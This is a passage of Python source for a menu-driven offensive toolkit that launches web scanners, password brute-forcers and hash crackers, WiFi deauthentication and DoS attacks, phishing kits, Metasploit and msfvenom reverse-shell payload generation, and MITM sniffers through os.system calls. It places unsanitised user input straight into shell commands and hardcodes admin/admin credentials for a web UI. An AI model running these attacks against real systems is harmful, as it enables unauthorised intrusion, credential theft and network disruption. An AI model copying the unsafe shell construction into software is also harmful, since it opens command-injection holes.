            self.target = input(f"{Fore.BLUE}[?] Enter URL to test XSS: {Fore.RESET}")
            
        os.system(f"python3 xsstrike.py -u {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_dirb(self):
        """Run Dirb"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path (default: /usr/share/wordlists/dirb/common.txt): {Fore.RESET}")
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
            
        os.system(f"dirb {self.target} {wordlist}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_gobuster(self):
        """Run Gobuster"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        print(f"{Fore.CYAN}Gobuster Mode:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Directory Scan")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Subdomain Scan")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}DNS Scan")
        
        mode = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        
        if mode == "1":
            os.system(f"gobuster dir -u {self.target} -w {wordlist}")
        elif mode == "2":
            os.system(f"gobuster vhost -u {self.target} -w {wordlist}")
        elif mode == "3":
            os.system(f"gobuster dns -d {self.target} -w {wordlist}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_dirsearch(self):
        """Run Dirsearch"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        os.system(f"dirsearch -u {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_wfuzz(self):
        """Run WFuzz"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL with FUZZ keyword: {Fore.RESET}")
            
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        os.system(f"wfuzz -c -z file,{wordlist} {self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_ffuf(self):
        """Run FFUF"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL with FUZZ keyword: {Fore.RESET}")
            
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        os.system(f"ffuf -u {self.target} -w {wordlist}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_commix(self):
        """Run Commix"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        os.system(f"commix --url={self.target}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_nosqlmap(self):
        """Run NoSQLMap"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        os.system(f"nosqlmap")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_xsstrike_advanced(self):
        """Run XSStrike with advanced options"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        os.system(f"python3 xsstrike.py -u {self.target} --crawl --blind")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_beef(self):
        """Run BeEF"""
        print(f"{Fore.YELLOW}[*] Starting BeEF...{Fore.RESET}")
        os.system("beef")
        print(f"{Fore.GREEN}[+] BeEF running on http://localhost:3000/ui/panel{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== PASSWORD ATTACKS ====================
    def password_menu(self):
        """Password Attacks Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🔐 PASSWORD ATTACKS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Hydra - Online Brute Force"),
                ("2", "John the Ripper - Hash Cracker"),
                ("3", "Hashcat - GPU Cracker"),
                ("4", "Medusa - Parallel Brute Force"),
                ("5", "Ncrack - Network Auth Cracker"),
                ("6", "Crunch - Wordlist Generator"),
                ("7", "CeWL - Custom Wordlist Generator"),
                ("8", "Fcrackzip - ZIP Password Cracker"),
                ("9", "Rarcrack - RAR Password Cracker"),
                ("10", "PDFcrack - PDF Password Cracker"),
                ("11", "Office2john - MS Office Cracker"),
                ("12", "Truecrack - TrueCrypt Cracker"),
                ("13", "Ophcrack - Windows Cracker"),
                ("14", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select password tool: {Fore.RESET}")
            
            if choice == "14":
                break
            elif choice == "1":
                self.run_hydra()
            elif choice == "2":
                self.run_john()
            elif choice == "3":
                self.run_hashcat()
            elif choice == "4":
                self.run_medusa()
            elif choice == "5":
                self.run_ncrack()
            elif choice == "6":
                self.run_crunch()
            elif choice == "7":
                self.run_cewl()
            elif choice == "8":
                self.run_fcrackzip()
            elif choice == "9":
                self.run_rarcrack()
            elif choice == "10":
                self.run_pdfcrack()
            elif choice == "11":
                self.run_office2john()
            elif choice == "12":
                self.run_truecrack()
            elif choice == "13":
                self.run_ophcrack()
                
    def run_hydra(self):
        """Run Hydra"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target IP: {Fore.RESET}")
            
        print(f"{Fore.CYAN}Services:{Fore.RESET}")
        print(f"{Fore.WHITE}1. SSH  2. FTP  3. HTTP  4. HTTPS  5. MySQL  6. PostgreSQL  7. RDP  8. SMB")
        
        service = input(f"\n{Fore.BLUE}[?] Select service number: {Fore.RESET}")
        
        service_map = {
            "1": "ssh", "2": "ftp", "3": "http", "4": "https",
            "5": "mysql", "6": "postgres", "7": "rdp", "8": "smb"
        }
        
        service_name = service_map.get(service, "ssh")
        
        userlist = input(f"{Fore.BLUE}[?] Username list path: {Fore.RESET}")
        passlist = input(f"{Fore.BLUE}[?] Password list path: {Fore.RESET}")
        
        if service_name in ["http", "https"]:
            method = input(f"{Fore.BLUE}[?] Method (get/post): {Fore.RESET}")
            path = input(f"{Fore.BLUE}[?] Login path (e.g., /login.php): {Fore.RESET}")
            form = input(f"{Fore.BLUE}[?] Form parameters (user=^USER^&pass=^PASS^): {Fore.RESET}")
            fail = input(f"{Fore.BLUE}[?] Failure string: {Fore.RESET}")
            
            cmd = f"hydra -L {userlist} -P {passlist} {self.target} {service_name}-{method}-form \"{path}:{form}:{fail}\""
        else:
            cmd = f"hydra -L {userlist} -P {passlist} {self.target} {service_name}"
            
        output_file = f"{self.output_dir}/hydra_{self.target}_{service_name}.txt"
        cmd += f" -o {output_file}"
        
        print(f"{Fore.YELLOW}[*] Running Hydra...{Fore.RESET}")
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Results saved to {output_file}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_john(self):
        """Run John the Ripper"""
        hash_file = input(f"{Fore.BLUE}[?] Path to hash file: {Fore.RESET}")
        
        print(f"{Fore.CYAN}Hash Formats:{Fore.RESET}")
        print(f"{Fore.WHITE}1. MD5  2. SHA1  3. SHA256  4. SHA512  5. NTLM  6. LM")
        
        format_choice = input(f"\n{Fore.BLUE}[?] Select format: {Fore.RESET}")
        
        format_map = {
            "1": "raw-md5", "2": "raw-sha1", "3": "raw-sha256",
            "4": "raw-sha512", "5": "nt", "6": "lm"
        }
        
        hash_format = format_map.get(format_choice, "raw-md5")
        
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path (optional): {Fore.RESET}")
        
        if wordlist:
            cmd = f"john --format={hash_format} --wordlist={wordlist} {hash_file}"
        else:
            cmd = f"john --format={hash_format} {hash_file}"
            
        os.system(cmd)
        print(f"\n{Fore.GREEN}[+] Cracked passwords:{Fore.RESET}")
        os.system(f"john --show {hash_file}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_hashcat(self):
        """Run Hashcat"""
        hash_file = input(f"{Fore.BLUE}[?] Path to hash file: {Fore.RESET}")
        
        print(f"{Fore.CYAN}Hash Modes:{Fore.RESET}")
        print(f"{Fore.WHITE}0 - MD5")
        print("100 - SHA1")
        print("1400 - SHA256")
        print("1700 - SHA512")
        print("1000 - NTLM")
        print("5500 - NetNTLMv1")
        print("5600 - NetNTLMv2")
        print("2500 - WPA/WPA2")
        print("3000 - LM")
        
        mode = input(f"\n{Fore.BLUE}[?] Enter hash mode number: {Fore.RESET}")
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        
        cmd = f"hashcat -m {mode} -a 0 {hash_file} {wordlist} --force"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_medusa(self):
        """Run Medusa"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        print(f"{Fore.CYAN}Services:{Fore.RESET} ssh, ftp, telnet, http, mysql, postgres, rdp, smbnt")
        service = input(f"{Fore.BLUE}[?] Service: {Fore.RESET}")
        userlist = input(f"{Fore.BLUE}[?] Username list: {Fore.RESET}")
        passlist = input(f"{Fore.BLUE}[?] Password list: {Fore.RESET}")
        
        cmd = f"medusa -h {self.target} -U {userlist} -P {passlist} -M {service}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_ncrack(self):
        """Run Ncrack"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter target: {Fore.RESET}")
            
        service = input(f"{Fore.BLUE}[?] Service (ssh/ftp/telnet): {Fore.RESET}")
        userlist = input(f"{Fore.BLUE}[?] Username list: {Fore.RESET}")
        passlist = input(f"{Fore.BLUE}[?] Password list: {Fore.RESET}")
        
        cmd = f"ncrack -U {userlist} -P {passlist} {self.target}:{service}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_crunch(self):
        """Run Crunch"""
        min_len = input(f"{Fore.BLUE}[?] Minimum length: {Fore.RESET}")
        max_len = input(f"{Fore.BLUE}[?] Maximum length: {Fore.RESET}")
        charset = input(f"{Fore.BLUE}[?] Character set (default: abcdefghijklmnopqrstuvwxyz): {Fore.RESET}")
        
        if not charset:
            charset = "abcdefghijklmnopqrstuvwxyz"
            
        output = f"{self.wordlist_dir}/crunch_{min_len}-{max_len}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        cmd = f"crunch {min_len} {max_len} {charset} -o {output}"
        print(f"{Fore.YELLOW}[*] Generating wordlist...{Fore.RESET}")
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Wordlist saved to {output}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_cewl(self):
        """Run CeWL"""
        if not self.target:
            self.target = input(f"{Fore.BLUE}[?] Enter URL: {Fore.RESET}")
            
        depth = input(f"{Fore.BLUE}[?] Crawl depth (default: 2): {Fore.RESET}")
        min_word = input(f"{Fore.BLUE}[?] Minimum word length (default: 3): {Fore.RESET}")
        output = f"{self.wordlist_dir}/cewl_{self.target}.txt"
        
        cmd = f"cewl {self.target} -d {depth or '2'} -m {min_word or '3'} -w {output}"
        print(f"{Fore.YELLOW}[*] Generating custom wordlist...{Fore.RESET}")
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Wordlist saved to {output}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_fcrackzip(self):
        """Run Fcrackzip"""
        zip_file = input(f"{Fore.BLUE}[?] Path to ZIP file: {Fore.RESET}")
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        
        cmd = f"fcrackzip -u -D -p {wordlist} {zip_file}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_rarcrack(self):
        """Run Rarcrack"""
        rar_file = input(f"{Fore.BLUE}[?] Path to RAR file: {Fore.RESET}")
        
        cmd = f"rarcrack {rar_file} --threads 4 --type rar"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_pdfcrack(self):
        """Run PDFcrack"""
        pdf_file = input(f"{Fore.BLUE}[?] Path to PDF file: {Fore.RESET}")
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path (optional): {Fore.RESET}")
        
        if wordlist:
            cmd = f"pdfcrack -f {pdf_file} -w {wordlist}"
        else:
            cmd = f"pdfcrack -f {pdf_file}"
            
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_office2john(self):
        """Run Office2John"""
        office_file = input(f"{Fore.BLUE}[?] Path to MS Office file: {Fore.RESET}")
        
        cmd = f"office2john {office_file} > {office_file}.hash"
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Hash saved to {office_file}.hash{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Now run john on the hash file{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_truecrack(self):
        """Run Truecrack"""
        volume = input(f"{Fore.BLUE}[?] Path to TrueCrypt volume: {Fore.RESET}")
        wordlist = input(f"{Fore.BLUE}[?] Wordlist path: {Fore.RESET}")
        
        cmd = f"truecrack -t {volume} -w {wordlist}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_ophcrack(self):
        """Run Ophcrack"""
        print(f"{Fore.YELLOW}[*] Starting Ophcrack...{Fore.RESET}")
        os.system("ophcrack &")
        
    # ==================== WIRELESS ATTACKS ====================
    def wireless_menu(self):
        """Wireless Attacks Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}📡 WIRELESS ATTACKS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Aircrack-ng - Complete WiFi Suite"),
                ("2", "Reaver - WPS Attack"),
                ("3", "PixieWPS - WPS Offline Attack"),
                ("4", "Wifite - Automated WiFi Auditor"),
                ("5", "Fluxion - Evil Twin Attack"),
                ("6", "Airgeddon - All-in-One WiFi"),
                ("7", "Kismet - Network Detector"),
                ("8", "MDK3 - WiFi DoS"),
                ("9", "Wifiphisher - Rogue AP"),
                ("10", "Bettercap - WiFi MITM"),
                ("11", "Ettercap - MITM Framework"),
                ("12", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select wireless tool: {Fore.RESET}")
            
            if choice == "12":
                break
            elif choice == "1":
                self.run_aircrack()
            elif choice == "2":
                self.run_reaver()
            elif choice == "3":
                self.run_pixiewps()
            elif choice == "4":
                self.run_wifite()
            elif choice == "5":
                self.run_fluxion()
            elif choice == "6":
                self.run_airgeddon()
            elif choice == "7":
                self.run_kismet()
            elif choice == "8":
                self.run_mdk3()
            elif choice == "9":
                self.run_wifiphisher()
            elif choice == "10":
                self.run_bettercap()
            elif choice == "11":
                self.run_ettercap()
                
    def run_aircrack(self):
        """Run Aircrack-ng suite"""
        while True:
            print(f"\n{Fore.CYAN}Aircrack-ng Menu:{Fore.RESET}")
            print(f"{Fore.WHITE}[1] {Fore.YELLOW}Start Monitor Mode")
            print(f"{Fore.WHITE}[2] {Fore.YELLOW}Stop Monitor Mode")
            print(f"{Fore.WHITE}[3] {Fore.YELLOW}Scan Networks")
            print(f"{Fore.WHITE}[4] {Fore.YELLOW}Capture Handshake")
            print(f"{Fore.WHITE}[5] {Fore.YELLOW}Deauth Attack")
            print(f"{Fore.WHITE}[6] {Fore.YELLOW}Crack Handshake")
            print(f"{Fore.WHITE}[7] {Fore.YELLOW}Back{Fore.RESET}")
            
            a_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
            
            if a_choice == "1":
                interface = input(f"{Fore.BLUE}[?] Wireless interface: {Fore.RESET}")
                os.system(f"airmon-ng start {interface}")
            elif a_choice == "2":
                interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
                os.system(f"airmon-ng stop {interface}")
            elif a_choice == "3":
                interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
                os.system(f"airodump-ng {interface}")
            elif a_choice == "4":
                interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
                bssid = input(f"{Fore.BLUE}[?] Target BSSID: {Fore.RESET}")
                channel = input(f"{Fore.BLUE}[?] Channel: {Fore.RESET}")
                os.system(f"airodump-ng -c {channel} --bssid {bssid} -w capture {interface}")
            elif a_choice == "5":
                interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
                bssid = input(f"{Fore.BLUE}[?] Target BSSID: {Fore.RESET}")
                client = input(f"{Fore.BLUE}[?] Client MAC (optional): {Fore.RESET}")
                
                if client:
                    os.system(f"aireplay-ng -0 10 -a {bssid} -c {client} {interface}")
                else:
                    os.system(f"aireplay-ng -0 10 -a {bssid} {interface}")
            elif a_choice == "6":
                cap_file = input(f"{Fore.BLUE}[?] Capture file: {Fore.RESET}")
                wordlist = input(f"{Fore.BLUE}[?] Wordlist: {Fore.RESET}")
                os.system(f"aircrack-ng -w {wordlist} {cap_file}")
            elif a_choice == "7":
                break
                
    def run_reaver(self):
        """Run Reaver"""
        interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
        bssid = input(f"{Fore.BLUE}[?] Target BSSID: {Fore.RESET}")
        channel = input(f"{Fore.BLUE}[?] Channel: {Fore.RESET}")
        
        cmd = f"reaver -i {interface} -b {bssid} -c {channel} -vv"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_pixiewps(self):
        """Run PixieWPS"""
        interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
        bssid = input(f"{Fore.BLUE}[?] Target BSSID: {Fore.RESET}")
        
        cmd = f"pixiewps -i {interface} -b {bssid}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_wifite(self):
        """Run Wifite"""
        os.system("wifite")
        
    def run_fluxion(self):
        """Run Fluxion"""
        os.system("fluxion")
        
    def run_airgeddon(self):
        """Run Airgeddon"""
        os.system("airgeddon")
        
    def run_kismet(self):
        """Run Kismet"""
        print(f"{Fore.YELLOW}[*] Starting Kismet...{Fore.RESET}")
        os.system("kismet &")
        
    def run_mdk3(self):
        """Run MDK3"""
        interface = input(f"{Fore.BLUE}[?] Monitor interface: {Fore.RESET}")
        
        print(f"{Fore.CYAN}MDK3 Attacks:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Beacon Flood")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Authentication DoS")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Deauth Attack")
        
        m_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if m_choice == "1":
            os.system(f"mdk3 {interface} b")
        elif m_choice == "2":
            os.system(f"mdk3 {interface} a")
        elif m_choice == "3":
            bssid = input(f"{Fore.BLUE}[?] Target BSSID: {Fore.RESET}")
            os.system(f"mdk3 {interface} d {bssid}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_wifiphisher(self):
        """Run Wifiphisher"""
        os.system("wifiphisher")
        
    def run_bettercap(self):
        """Run Bettercap"""
        print(f"{Fore.CYAN}Bettercap Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Start Bettercap")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Start with web UI")
        
        b_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if b_choice == "1":
            os.system("bettercap")
        elif b_choice == "2":
            os.system("bettercap -eval 'set api.rest.username admin; set api.rest.password admin; api.rest on; ui'")
            print(f"{Fore.GREEN}[+] Web UI: http://localhost:80{Fore.RESET}")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_ettercap(self):
        """Run Ettercap"""
        print(f"{Fore.CYAN}Ettercap Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Text Mode")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}GUI Mode")
        
        e_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if e_choice == "1":
            os.system("ettercap -T")
        elif e_choice == "2":
            os.system("ettercap -G &")
            
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== SOCIAL ENGINEERING ====================
    def social_menu(self):
        """Social Engineering Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🎭 SOCIAL ENGINEERING{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Social Engineering Toolkit (SET)"),
                ("2", "Gophish - Phishing Framework"),
                ("3", "BlackEye - Phishing Pages"),
                ("4", "HiddenEye - Phishing Toolkit"),
                ("5", "KingPhisher - Phishing Campaign"),
                ("6", "PhishX - Phishing Tool"),
                ("7", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select social tool: {Fore.RESET}")
            
            if choice == "7":
                break
            elif choice == "1":
                self.run_set()
            elif choice == "2":
                self.run_gophish()
            elif choice == "3":
                self.run_blackeye()
            elif choice == "4":
                self.run_hiddeneye()
            elif choice == "5":
                self.run_kingphisher()
            elif choice == "6":
                self.run_phishx()
                
    def run_set(self):
        """Run Social Engineering Toolkit"""
        os.system("setoolkit")
        
    def run_gophish(self):
        """Run Gophish"""
        print(f"{Fore.YELLOW}[*] Starting Gophish...{Fore.RESET}")
        os.system("gophish &")
        print(f"{Fore.GREEN}[+] Admin UI: https://localhost:3333{Fore.RESET}")
        print(f"{Fore.GREEN}[+] Phishing Server: http://localhost:80{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_blackeye(self):
        """Run BlackEye"""
        os.system("blackeye")
        
    def run_hiddeneye(self):
        """Run HiddenEye"""
        os.system("hiddeneye")
        
    def run_kingphisher(self):
        """Run KingPhisher"""
        print(f"{Fore.YELLOW}[*] Starting KingPhisher...{Fore.RESET}")
        os.system("king-phisher &")
        
    def run_phishx(self):
        """Run PhishX"""
        os.system("phishx")
        
    # ==================== EXPLOITATION ====================
    def exploit_menu(self):
        """Exploitation Tools Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}💣 EXPLOITATION FRAMEWORKS{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Metasploit Framework"),
                ("2", "Searchsploit - Exploit Database"),
                ("3", "BeEF - Browser Exploitation"),
                ("4", "Armitage - Metasploit GUI"),
                ("5", "Cobalt Strike (Commercial)"),
                ("6", "Empire - PowerShell Exploit"),
                ("7", "Koadic - Windows Exploit"),
                ("8", "Pupy - Cross-platform RAT"),
                ("9", "MSFvenom - Payload Generator"),
                ("10", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select exploit tool: {Fore.RESET}")
            
            if choice == "10":
                break
            elif choice == "1":
                self.run_metasploit()
            elif choice == "2":
                self.run_searchsploit()
            elif choice == "3":
                self.run_beef()
            elif choice == "4":
                self.run_armitage()
            elif choice == "5":
                self.run_cobalt()
            elif choice == "6":
                self.run_empire()
            elif choice == "7":
                self.run_koadic()
            elif choice == "8":
                self.run_pupy()
            elif choice == "9":
                self.run_msfvenom()
                
    def run_metasploit(self):
        """Run Metasploit"""
        print(f"{Fore.CYAN}Metasploit Options:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}msfconsole")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}msfdb (Database)")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}msfvenom (Payloads)")
        
        m_choice = input(f"\n{Fore.BLUE}[?] Choose: {Fore.RESET}")
        
        if m_choice == "1":
            os.system("msfconsole")
        elif m_choice == "2":
            os.system("msfdb init && msfconsole")
        elif m_choice == "3":
            self.run_msfvenom()
            
    def run_searchsploit(self):
        """Run Searchsploit"""
        search = input(f"{Fore.BLUE}[?] Search term: {Fore.RESET}")
        os.system(f"searchsploit {search}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_armitage(self):
        """Run Armitage"""
        print(f"{Fore.YELLOW}[*] Starting Armitage...{Fore.RESET}")
        os.system("armitage &")
        
    def run_cobalt(self):
        """Cobalt Strike info"""
        print(f"{Fore.YELLOW}[*] Cobalt Strike is commercial software{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Download from: https://www.cobaltstrike.com/{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_empire(self):
        """Run Empire"""
        print(f"{Fore.YELLOW}[*] Starting Empire...{Fore.RESET}")
        os.system("empire")
        
    def run_koadic(self):
        """Run Koadic"""
        os.system("koadic")
        
    def run_pupy(self):
        """Run Pupy"""
        os.system("pupy")
        
    def run_msfvenom(self):
        """Run MSFvenom"""
        print(f"{Fore.CYAN}MSFvenom Payloads:{Fore.RESET}")
        print(f"{Fore.WHITE}[1] {Fore.YELLOW}Windows Reverse TCP")
        print(f"{Fore.WHITE}[2] {Fore.YELLOW}Linux Reverse TCP")
        print(f"{Fore.WHITE}[3] {Fore.YELLOW}Android Reverse TCP")
        print(f"{Fore.WHITE}[4] {Fore.YELLOW}PHP Reverse TCP")
        print(f"{Fore.WHITE}[5] {Fore.YELLOW}Python Reverse TCP")
        print(f"{Fore.WHITE}[6] {Fore.YELLOW}Custom{Fore.RESET}")
        
        p_choice = input(f"\n{Fore.BLUE}[?] Choose payload type: {Fore.RESET}")
        
        lhost = input(f"{Fore.BLUE}[?] LHOST (your IP): {Fore.RESET}")
        lport = input(f"{Fore.BLUE}[?] LPORT: {Fore.RESET}")
        output = input(f"{Fore.BLUE}[?] Output file: {Fore.RESET}")
        
        payload_map = {
            "1": f"windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}",
            "2": f"linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}",
            "3": f"android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}.apk",
            "4": f"php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {output}.php",
            "5": f"python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}.py"
        }
        
        if p_choice == "6":
            payload = input(f"{Fore.BLUE}[?] Enter full payload name: {Fore.RESET}")
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output}"
        else:
            cmd = f"msfvenom -p {payload_map.get(p_choice, '')}"
            
        os.system(cmd)
        print(f"{Fore.GREEN}[+] Payload generated: {output}{Fore.RESET}")
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    # ==================== SNIFFING & MITM ====================
    def sniffing_menu(self):
        """Sniffing & MITM Menu"""
        while True:
            self.print_banner()
            print(f"\n{Fore.CYAN}🕵️ SNIFFING & MITM{Fore.RESET}")
            print(f"{Fore.GREEN}════════════════════════════════════════════════{Fore.RESET}")
            
            tools = [
                ("1", "Wireshark - Packet Analyzer"),
                ("2", "Tcpdump - CLI Sniffer"),
                ("3", "Ettercap - MITM Framework"),
                ("4", "Bettercap - Advanced MITM"),
                ("5", "Responder - LLMNR Poisoning"),
                ("6", "MITMf - MITM Framework"),
                ("7", "SniffJoke - Traffic Obfuscation"),
                ("8", "HoneyBadger - SSH MITM"),
                ("9", "Back to Main Menu")
            ]
            
            for num, name in tools:
                print(f"{Fore.WHITE}[{num}] {Fore.YELLOW}{name}{Fore.RESET}")
                
            choice = input(f"\n{Fore.BLUE}[?] Select sniffing tool: {Fore.RESET}")
            
            if choice == "9":
                break
            elif choice == "1":
                self.run_wireshark()
            elif choice == "2":
                self.run_tcpdump()
            elif choice == "3":
                self.run_ettercap()
            elif choice == "4":
                self.run_bettercap()
            elif choice == "5":
                self.run_responder()
            elif choice == "6":
                self.run_mitmf()
            elif choice == "7":
                self.run_sniffjoke()
            elif choice == "8":
                self.run_honeybadger()
                
    def run_wireshark(self):
        """Run Wireshark"""
        os.system("wireshark &")
        
    def run_tcpdump(self):
        """Run Tcpdump"""
        interface = input(f"{Fore.BLUE}[?] Interface (e.g., eth0): {Fore.RESET}")
        count = input(f"{Fore.BLUE}[?] Packet count (default: 100): {Fore.RESET}") or "100"
        
        cmd = f"tcpdump -i {interface} -c {count}"
        os.system(cmd)
        input(f"{Fore.YELLOW}[*] Press Enter to continue...{Fore.RESET}")
        
    def run_responder(self):
        """Run Responder"""
        interface = input(f"{Fore.BLUE}[?] Interface: {Fore.RESET}")
        
        print(f"{Fore.YELLOW}[*] Starting Responder...{Fore.RESET}")
